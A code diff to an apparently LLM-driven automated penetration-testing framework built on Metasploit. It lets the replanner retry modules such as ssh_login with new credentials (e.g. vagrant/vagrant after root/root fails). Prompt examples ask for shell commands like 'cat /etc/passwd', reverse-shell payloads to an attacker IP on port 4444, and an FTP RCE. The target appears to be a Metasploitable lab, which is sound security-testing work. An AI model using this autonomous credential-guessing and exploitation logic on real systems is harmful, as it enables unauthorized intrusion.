@@ -617,7 +617,9 @@ _MSF_FAILURE_PATTERNS: list[tuple[re.Pattern, str]] = [
     (re.compile(r"could not resolve host", re.IGNORECASE), "network_dns"),
     (re.compile(r"bad-config:", re.IGNORECASE), "config_problem"),
     (re.compile(r"timeout|timed out", re.IGNORECASE), "timeout"),
-    (re.compile(r"Authentication failed|Login failed", re.IGNORECASE), "auth_failed"),
+    (re.compile(r"Authentication failed|Login failed|no credentials found|"
+                r"All login attempts failed|No valid credentials",
+                re.IGNORECASE), "auth_failed"),
 ]
 
 
@@ -1399,6 +1401,14 @@ RESPOND WITH EXACTLY ONE of these JSON shapes:
     "goal": "Get shell via FTP",
     "rationale": "ProFTPD 1.3.5 on port 21 -- known mod_copy RCE"}
 
+1b) Use an MSF module with SPECIFIC options (optional `module_options` /
+    `payload_options` override the defaults — use this to retry a module with
+    DIFFERENT credentials or settings, e.g. after root/root failed):
+   {"action": "use_module",
+    "target_hint": "auxiliary/scanner/ssh/ssh_login",
+    "module_options": {"USERNAME": "vagrant", "PASSWORD": "vagrant"},
+    "rationale": "root/root failed -- try the common Metasploitable creds"}
+
 2) Run shell/session commands (newline-separated if multiple):
    {"action": "run_commands",
     "target_hint": "id\\ncat /etc/passwd",
@@ -1467,6 +1477,22 @@ def _guess_rport_from_module(module: str) -> Optional[int]:
     return None
 
 
+def _config_key(module: str, options: dict) -> tuple:
+    """Stable (module, sorted-options) tuple for anti-repeat detection.
+
+    Comparing the full option set — not just the module path — lets the
+    replanner legitimately retry the SAME module with DIFFERENT options (the
+    canonical case: ssh_login with new credentials after root/root failed),
+    while still blocking a literal re-run of the same module+options that
+    already failed. Shared options (RHOSTS/RPORT) are identical across attempts
+    so they don't affect the comparison; the discriminating options
+    (USERNAME/PASSWORD/TARGETURI/...) are what make two configs distinct."""
+    return (
+        str(module or ""),
+        tuple(sorted((str(k), str(v)) for k, v in (options or {}).items())),
+    )
+
+
 def _expand_intent_to_node(
     intent: dict, graph: AttackGraph, stuck_node: AttackNode,
 ) -> Optional[AttackNode]:
@@ -1508,6 +1534,17 @@ def _expand_intent_to_node(
         if rport:
             module_options["RPORT"] = rport
         payload_options = {"LHOST": graph.attacker_ip, "LPORT": 4444}
+        # Stage X: let the intent override/extend the defaults. This is how the
+        # replanner expresses "same module, DIFFERENT options" — chiefly new
+        # credentials (USERNAME/PASSWORD) for a credential attack that failed.
+        # Absent fields keep the defaults (backward-compatible). Intent wins on
+        # conflicts (the LLM may know a better RHOSTS/TARGETURI/etc.).
+        intent_mod_opts = intent.get("module_options")
+        if isinstance(intent_mod_opts, dict):
+            module_options = {**module_options, **intent_mod_opts}
+        intent_pay_opts = intent.get("payload_options")
+        if isinstance(intent_pay_opts, dict):
+            payload_options = {**payload_options, **intent_pay_opts}
         return AttackNode(
             id=nid,
             label=label,
@@ -1624,6 +1661,10 @@ def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) ->
                 "goal": node.goal,
                 "status": "FAILED — DO NOT propose this same approach again",
                 "module": node.module,                          # what was tried
+                # Stage X: show the options that failed (esp. USERNAME/PASSWORD)
+                # so the replanner can retry the SAME module with DIFFERENT creds
+                # rather than blindly switching attack vector.
+                "module_options": node.module_options,
                 "commands_to_run": node.commands_to_run[:3],    # first 3 cmds
                 "failure_reason": node.metadata.get("last_failure_reason", "unknown"),
                 # Stage C: specific category + phrase so the LLM can pivot
@@ -1745,14 +1786,18 @@ def _replan_from(graph: AttackGraph, stuck_node_id: str, log: logging.Logger) ->
         # not speculative — Stage 1's loosening was about heuristic version
         # rejection, this is "you literally tried this and it didn't work".
         if new_node.module:
-            failed_with_same_module = [
+            new_key = _config_key(new_node.module, new_node.module_options)
+            failed_with_same_config = [
                 n.id for n in graph.nodes.values()
-                if n.status == NodeStatus.FAILED.value and n.module == new_node.module
+                if n.status == NodeStatus.FAILED.value
+                and n.module == new_node.module
+                and _config_key(n.module, n.module_options) == new_key
             ]
-            if failed_with_same_module:
+            if failed_with_same_config:
                 log.warning(
-                    f"[Replanner] REJECTED {new_node.module}: already tried "
-                    f"and failed in {failed_with_same_module}"
+                    f"[Replanner] REJECTED {new_node.module} with identical options: "
+                    f"already tried and failed in {failed_with_same_config} "
+                    f"(a DIFFERENT option set — e.g. new credentials — would be allowed)"
                 )
                 return None
         elif new_node.commands_to_run:
